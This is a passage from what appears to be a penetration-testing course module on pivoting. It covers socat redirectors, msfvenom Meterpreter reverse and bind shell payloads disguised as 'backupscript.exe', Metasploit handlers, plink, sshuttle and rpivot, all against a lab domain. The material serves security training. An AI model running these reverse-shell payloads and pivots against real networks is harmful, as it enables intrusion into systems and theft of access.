<pre><code class="lang-shell-session">ubuntu<span class="hljs-variable">@Webserver</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>socat TCP4-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">8080</span>,fork <span class="hljs-symbol">TCP4:</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span>
</code></pre>
<p>Socat will listen on localhost on port <code>8080</code> and forward all the traffic to port <code>80</code> on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host&#39;s listener, where we would be getting a shell.</p>
<p><strong>Creating the Windows Payload</strong></p>
<p>Socat Redirection with a Reverse Shell</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_https LHOST=<span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.129</span> -f exe -o backupscript.exe LPORT=<span class="hljs-number">8080</span>

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">743</span> bytes
Final size of exe <span class="hljs-string">file:</span> <span class="hljs-number">7168</span> bytes
Saved <span class="hljs-string">as:</span> backupscript.exe
</code></pre>
<p>Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.</p>
<p><strong>Starting MSF Console</strong></p>
<p>Socat Redirection with a Reverse Shell</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo msfconsole

&lt;SNIP&gt;
</code></pre>
<p><strong>Configuring &amp; Starting the multi/handler</strong></p>
<p>Socat Redirection with a Reverse Shell</p>
<pre><code class="lang-shell-session">msf6 &gt; use exploit/multi/handler

[*] <span class="hljs-keyword">Using</span> configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_https
payload =&gt; windows/<span class="hljs-comment">x64</span>/meterpreter/<span class="hljs-comment">reverse_https</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; set lhost <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
lhost =&gt; <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
msf6 exploit(multi/<span class="hljs-comment">handler) &gt; set lport 80</span>
lport <span class="hljs-comment">=&gt; 80</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; run

[*] Started HTTPS reverse handler on https:<span class="hljs-comment">//0.0.0.0:80</span>
</code></pre>
<p>We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.</p>
<p><strong>Establishing the Meterpreter Session</strong></p>
<pre><code class="lang-shell-session">[!] https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">80</span> handling request from <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span><span class="hljs-comment">; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!</span>
[*] https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">80</span> handling request from <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span><span class="hljs-comment">; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...</span>
[!] https://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">80</span> handling request from <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span><span class="hljs-comment">; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!</span>
[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.18</span>:<span class="hljs-number">80</span> -&gt; <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span> ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">07</span> <span class="hljs-number">11</span>:<span class="hljs-number">08</span>:<span class="hljs-number">10</span> -<span class="hljs-number">0500</span>

meterpreter &gt; getuid
Server username: INLANEFREIGHT\victor
</code></pre>
<h2 id="socat-redirection-with-a-bind-shell">Socat Redirection with a Bind Shell</h2>
<p>Similar to our socat&#39;s reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/55.png" alt=""></p>
<p>We can create a bind shell using msfvenom with the below command.</p>
<p><strong>Creating the Windows Payload</strong></p>
<p>Socat Redirection with a Bind Shell</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_tcp -f exe -o backupscript.exe LPORT=<span class="hljs-number">8443</span>

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">499</span> bytes
Final size of exe <span class="hljs-string">file:</span> <span class="hljs-number">7168</span> bytes
Saved <span class="hljs-string">as:</span> backupjob.exe
</code></pre>
<p>We can start a <code>socat bind shell</code> listener, which listens on port <code>8080</code> and forwards packets to Windows server <code>8443</code>.</p>
<p><strong>Starting Socat Bind Shell Listener</strong></p>
<p>Socat Redirection with a Bind Shell</p>
<pre><code class="lang-shell-session">ubuntu<span class="hljs-variable">@Webserver</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>socat TCP4-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">8080</span>,fork <span class="hljs-symbol">TCP4:</span><span class="hljs-number">172.16</span>.<span class="hljs-number">5.19</span><span class="hljs-symbol">:</span><span class="hljs-number">8443</span>
</code></pre>
<p>Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat&#39;s listener on port 8080 (Ubuntu server)</p>
<p><strong>Configuring &amp; Starting the Bind multi/handler</strong></p>
<p>Socat Redirection with a Bind Shell</p>
<pre><code class="lang-shell-session">msf6 &gt; use exploit/multi/handler

[*] <span class="hljs-keyword">Using</span> configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter</span>/bind_tcp
payload =&gt; windows/<span class="hljs-comment">x64</span>/meterpreter/<span class="hljs-comment">bind_tcp</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; set RHOST <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>
RHOST =&gt; <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>
msf6 exploit(multi/<span class="hljs-comment">handler) &gt; set LPORT 8080</span>
LPORT <span class="hljs-comment">=&gt; 8080</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; run

[*] Started bind TCP handler against <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>:<span class="hljs-number">8080</span>
</code></pre>
<p>We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.</p>
<p><strong>Establishing Meterpreter Session</strong></p>
<p>Socat Redirection with a Bind Shell</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (200262 <span class="hljs-selector-tag">bytes</span>) <span class="hljs-selector-tag">to</span> 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.202</span><span class="hljs-selector-class">.64</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> 1 <span class="hljs-selector-tag">opened</span> (10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.18</span><span class="hljs-selector-pseudo">:46253</span> <span class="hljs-selector-tag">-</span>&gt; 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.202</span><span class="hljs-selector-class">.64</span><span class="hljs-selector-pseudo">:8080</span> ) <span class="hljs-selector-tag">at</span> 2022<span class="hljs-selector-tag">-03-07</span> 12<span class="hljs-selector-pseudo">:44</span><span class="hljs-selector-pseudo">:44</span> <span class="hljs-selector-tag">-0500</span>

<span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">getuid</span>
<span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">username</span>: <span class="hljs-selector-tag">INLANEFREIGHT</span>\<span class="hljs-selector-tag">victor</span>
</code></pre>
<h2 id="ssh-for-windows-plink-exe">SSH for Windows: plink.exe</h2>
<hr>
<p><a href="https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html">Plink</a>, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of <a href="https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh\_overview">2018</a>, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was <a href="https://www.putty.org/">PuTTY</a>.</p>
<p>Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer.</p>
<p>That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.</p>
<hr>
<h3 id="getting-to-know-plink">Getting To Know Plink</h3>
<p>In the below image, we have a Windows-based attack host.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/66.png" alt=""></p>
<p>The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.</p>
<p><strong>Using Plink.exe</strong></p>
<p>SSH for Windows: plink.exe</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">plink</span> <span class="hljs-selector-tag">-ssh</span> <span class="hljs-selector-tag">-D</span> 9050 <span class="hljs-selector-tag">ubuntu</span>@<span class="hljs-keyword">10</span>.<span class="hljs-keyword">129</span>.<span class="hljs-keyword">15</span>.<span class="hljs-keyword">50</span>
</code></pre>
<p>Another Windows-based tool called <a href="https://www.proxifier.com/">Proxifier</a> can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/reverse\_shell\_9.png" alt=""></p>
<p>After configuring the SOCKS server for <code>127.0.0.1</code> and port 9050, we can directly start <code>mstsc.exe</code> to start an RDP session with a Windows target that allows RDP connections.</p>
<h2 id="ssh-pivoting-with-sshuttle">SSH Pivoting with Sshuttle</h2>
<hr>
<p><a href="https://github.com/sshuttle/sshuttle">Sshuttle</a> is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. <code>Sshuttle</code> can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap&#39;s network traffic with sshuttle using the example later in this section.</p>
<p>One interesting usage of sshuttle is that we don&#39;t need to use proxychains to connect to the remote hosts. Let&#39;s install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.</p>
<p><strong>Installing sshuttle</strong></p>
<p>SSH Pivoting with Sshuttle</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt-get <span class="hljs-keyword">install</span> sshuttle

Reading <span class="hljs-keyword">package</span> lists... Done
Building dependency tree... Done
Reading state information... Done
The <span class="hljs-keyword">following</span> packages were automatically installed <span class="hljs-keyword">and</span> <span class="hljs-keyword">are</span> <span class="hljs-keyword">no</span> longer <span class="hljs-keyword">required</span>:
  alsa-tools golang<span class="hljs-number">-1.15</span> golang<span class="hljs-number">-1.15</span>-doc golang<span class="hljs-number">-1.15</span>-<span class="hljs-keyword">go</span> golang<span class="hljs-number">-1.15</span>-src
  golang<span class="hljs-number">-1.16</span>-src libcmis<span class="hljs-number">-0.5</span><span class="hljs-number">-5</span>v5 libct4 libgvm20 liblibreoffice-<span class="hljs-keyword">java</span>
  libmotif-common libqrcodegencpp1 libunoloader-<span class="hljs-keyword">java</span> libxm4
  linux-headers<span class="hljs-number">-5.10</span><span class="hljs-number">.0</span><span class="hljs-number">-6</span>parrot1-common python-babel-localedata
  python3-aiofiles python3-babel python3-fastapi python3-pydantic
  python3-slowapi python3-starlette python3-uvicorn sqsh ure-<span class="hljs-keyword">java</span>
<span class="hljs-keyword">Use</span> <span class="hljs-string">'sudo apt autoremove'</span> <span class="hljs-keyword">to</span> remove them.
Suggested packages:
  autossh
The <span class="hljs-keyword">following</span> <span class="hljs-keyword">NEW</span> packages will be installed:
  sshuttle
<span class="hljs-number">0</span> upgraded, <span class="hljs-number">1</span> newly installed, <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> remove <span class="hljs-keyword">and</span> <span class="hljs-number">4</span> <span class="hljs-keyword">not</span> upgraded.
Need <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-number">91.8</span> kB <span class="hljs-keyword">of</span> archives.
<span class="hljs-keyword">After</span> this operation, <span class="hljs-number">508</span> kB <span class="hljs-keyword">of</span> additional disk <span class="hljs-keyword">space</span> will be used.
<span class="hljs-keyword">Get</span>:<span class="hljs-number">1</span> https://<span class="hljs-keyword">ftp</span>-stud.hs-esslingen.de/Mirrors/archive.parrotsec.org <span class="hljs-keyword">rolling</span>/<span class="hljs-keyword">main</span> amd64 sshuttle all <span class="hljs-number">1.0</span><span class="hljs-number">.5</span><span class="hljs-number">-1</span> [<span class="hljs-number">91.8</span> kB]
Fetched <span class="hljs-number">91.8</span> kB <span class="hljs-keyword">in</span> <span class="hljs-number">2</span>s (<span class="hljs-number">52.1</span> kB/s) 
Selecting previously unselected <span class="hljs-keyword">package</span> sshuttle.
(Reading <span class="hljs-keyword">database</span> ... <span class="hljs-number">468019</span> files <span class="hljs-keyword">and</span> directories currently installed.)
Preparing <span class="hljs-keyword">to</span> unpack .../sshuttle_1<span class="hljs-number">.0</span><span class="hljs-number">.5</span><span class="hljs-number">-1</span>_all.deb ...
Unpacking sshuttle (<span class="hljs-number">1.0</span><span class="hljs-number">.5</span><span class="hljs-number">-1</span>) ...
Setting up sshuttle (<span class="hljs-number">1.0</span><span class="hljs-number">.5</span><span class="hljs-number">-1</span>) ...
Processing <span class="hljs-keyword">triggers</span> <span class="hljs-keyword">for</span> man-db (<span class="hljs-number">2.9</span><span class="hljs-number">.4</span><span class="hljs-number">-2</span>) ...
Processing <span class="hljs-keyword">triggers</span> <span class="hljs-keyword">for</span> doc-base (<span class="hljs-number">0.11</span><span class="hljs-number">.1</span>) ...
Processing <span class="hljs-number">1</span> added doc-base file...
Scanning application launchers
Removing <span class="hljs-keyword">duplicate</span> launchers <span class="hljs-keyword">or</span> broken launchers
Launchers <span class="hljs-keyword">are</span> <span class="hljs-keyword">updated</span>
</code></pre>
<p>To use sshuttle, we specify the option <code>-r</code> to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.</p>
<p><strong>Running sshuttle</strong></p>
<p>SSH Pivoting with Sshuttle</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo sshuttle -r ubuntu@<span class="hljs-number">10.129</span>.<span class="hljs-number">202.64</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">5.0</span>/<span class="hljs-number">23</span> -v 

Starting sshuttle proxy (version <span class="hljs-number">1.1</span>.<span class="hljs-number">0</span>).
c : Starting firewall manager <span class="hljs-keyword">with</span> command: [<span class="hljs-string">'/usr/bin/python3'</span>, <span class="hljs-string">'/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py'</span>, <span class="hljs-string">'-v'</span>, <span class="hljs-string">'--method'</span>, <span class="hljs-string">'auto'</span>, <span class="hljs-string">'--firewall'</span>]
fw: Starting firewall <span class="hljs-keyword">with</span> Python version <span class="hljs-number">3.9</span>.<span class="hljs-number">2</span>
fw: ready <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">name</span> <span class="hljs-title">nat</span>.
<span class="hljs-title">c</span> :</span> IPv6 enabled: <span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> IPv6 listen address ::<span class="hljs-number">1</span>
c : <span class="hljs-function"><span class="hljs-keyword">Method</span>:</span> nat
c : IPv4: <span class="hljs-keyword">on</span>
c : IPv6: <span class="hljs-keyword">on</span>
c : UDP : off (<span class="hljs-keyword">not</span> available <span class="hljs-keyword">with</span> nat <span class="hljs-function"><span class="hljs-keyword">method</span>)
<span class="hljs-title">c</span> :</span> DNS : off (available)
c : User: off (available)
c : Subnets <span class="hljs-keyword">to</span> <span class="hljs-keyword">forward</span> through remote host (<span class="hljs-keyword">type</span>, IP, cidr mask width, startPort, endPort):
c :   (&lt;AddressFamily.AF_INET: <span class="hljs-number">2</span>&gt;, <span class="hljs-string">'172.16.5.0'</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
c : Subnets <span class="hljs-keyword">to</span> exclude <span class="hljs-keyword">from</span> forwarding:
c :   (&lt;AddressFamily.AF_INET: <span class="hljs-number">2</span>&gt;, <span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
c :   (&lt;AddressFamily.AF_INET6: <span class="hljs-number">10</span>&gt;, <span class="hljs-string">'::1'</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
c : TCP redirector listening <span class="hljs-keyword">on</span> (<span class="hljs-string">'::1'</span>, <span class="hljs-number">12300</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>).
c : TCP redirector listening <span class="hljs-keyword">on</span> (<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">12300</span>).
c : Starting client <span class="hljs-keyword">with</span> Python version <span class="hljs-number">3.9</span>.<span class="hljs-number">2</span>
c : Connecting <span class="hljs-keyword">to</span> server...
ubuntu@<span class="hljs-number">10.129</span>.<span class="hljs-number">202.64</span><span class="hljs-string">'s password: 
 s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
 s: latency control setting = True
 s: auto-nets:False
c : Connected to server.
fw: setting up.
fw: ip6tables -w -t nat -N sshuttle-12300
fw: ip6tables -w -t nat -F sshuttle-12300
fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
fw: iptables -w -t nat -N sshuttle-12300
fw: iptables -w -t nat -F sshuttle-12300
fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300</span>
</code></pre>
<p>With this command, sshuttle creates an entry in our <code>iptables</code> to redirect all traffic to the 172.16.5.0/23 network through the pivot host.</p>
<p><strong>Traffic Routing through iptables Routes</strong></p>
<p>SSH Pivoting with Sshuttle</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nmap -v -sV -p3389 <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.19</span> -A -Pn

Host discovery disabled (-Pn). <span class="hljs-keyword">All</span> addresses will be marked 'up' and scan times may be slower.
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-03</span><span class="hljs-number">-08</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span> EST
NSE: Loaded <span class="hljs-number">155</span> scripts <span class="hljs-keyword">for</span> scanning.
NSE: <span class="hljs-keyword">Script</span> Pre-scanning.
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.15</span>s elapsed
Initiating Connect Scan <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Scanning <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.19</span> [<span class="hljs-number">1</span> port]
Completed Connect Scan <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">2.00</span>s elapsed (<span class="hljs-number">1</span> total ports)
Initiating Service scan <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
NSE: <span class="hljs-keyword">Script</span> scanning <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.19</span>.
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.19</span>
Host is up.

PORT     STATE SERVICE       VERSION
<span class="hljs-number">3389</span>/tcp open  ms-wbt-server Microsoft Terminal Services
| <span class="hljs-type">rdp</span>-ntlm-info: 
|   <span class="hljs-type">Target_Name</span>: INLANEFREIGHT
|   <span class="hljs-type">NetBIOS_Domain_Name</span>: INLANEFREIGHT
|   <span class="hljs-type">NetBIOS_Computer_Name</span>: DC01
|   <span class="hljs-type">DNS_Domain_Name</span>: inlanefreight.local
|   <span class="hljs-type">DNS_Computer_Name</span>: DC01.inlanefreight.local
|   <span class="hljs-type">Product_Version</span>: <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span>
|<span class="hljs-type">_</span>  System_Time: <span class="hljs-number">2022</span><span class="hljs-number">-08</span><span class="hljs-number">-14</span>T02:<span class="hljs-number">58</span>:<span class="hljs-number">25</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
|<span class="hljs-type">_ssl</span>-date: <span class="hljs-number">2022</span><span class="hljs-number">-08</span><span class="hljs-number">-14</span>T02:<span class="hljs-number">58</span>:<span class="hljs-number">25</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">7</span>s from scanner <span class="hljs-built_in">time</span>.
| <span class="hljs-type">ssl</span>-cert: Subject: commonName=DC01.inlanefreight.local
| <span class="hljs-type">Issuer</span>: commonName=DC01.inlanefreight.local
| <span class="hljs-type">Public</span> Key type: rsa
| <span class="hljs-type">Public</span> Key bits: <span class="hljs-number">2048</span>
| <span class="hljs-type">Signature</span> Algorithm: sha256WithRSAEncryption
| <span class="hljs-type">Not</span> valid <span class="hljs-built_in">before</span>: <span class="hljs-number">2022</span><span class="hljs-number">-08</span><span class="hljs-number">-13</span>T02:<span class="hljs-number">51</span>:<span class="hljs-number">48</span>
| <span class="hljs-type">Not</span> valid <span class="hljs-built_in">after</span>:  <span class="hljs-number">2023</span><span class="hljs-number">-02</span><span class="hljs-number">-12</span>T02:<span class="hljs-number">51</span>:<span class="hljs-number">48</span>
| <span class="hljs-type">MD5</span>:   <span class="hljs-number">58</span>a1 <span class="hljs-number">27</span>de <span class="hljs-number">5</span>f06 fea6 <span class="hljs-number">0e18</span> <span class="hljs-number">9</span>a02 f0de <span class="hljs-number">982</span>b
|<span class="hljs-type">_SHA</span><span class="hljs-number">-1</span>: f490 dc7d <span class="hljs-number">3387</span> <span class="hljs-number">9962</span> <span class="hljs-number">745</span>a <span class="hljs-number">9</span>ef8 <span class="hljs-number">8</span>c15 d20e <span class="hljs-number">477</span>f <span class="hljs-number">88</span>cb
Service <span class="hljs-keyword">Info</span>: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|<span class="hljs-type">_clock</span>-skew: mean: <span class="hljs-number">6</span>s, deviation: <span class="hljs-number">0</span>s, median: <span class="hljs-number">6</span>s


NSE: <span class="hljs-keyword">Script</span> Post-scanning.
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Initiating NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>
Completed NSE <span class="hljs-built_in">at</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>, <span class="hljs-number">0.00</span>s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-built_in">in</span> <span class="hljs-number">4.07</span> seconds
</code></pre>
<p>We can now use any tool directly without using proxychains.</p>
<h2 id="web-server-pivoting-with-rpivot">Web Server Pivoting with Rpivot</h2>
<hr>
<p><a href="https://github.com/klsecservices/rpivot">Rpivot</a> is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client&#39;s local port on the server-side. We will take the scenario below, where we have a web server on our internal network (<code>172.16.5.135</code>), and we want to access that using the rpivot proxy.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/77.png" alt=""></p>
<p>We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.</p>
<p><strong>Cloning rpivot</strong></p>
<p>Web Server Pivoting with Rpivot</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/klsecservices/rpivot.git
</code></pre>
<p><strong>Installing Python2.7</strong></p>
<p>Web Server Pivoting with Rpivot</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo apt-get install python2.<span class="hljs-number">7</span>
</code></pre>
<p>We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using <code>server.py</code>.</p>
<p><strong>Running server.py from the Attack Host</strong></p>
<p>Web Server Pivoting with Rpivot</p>
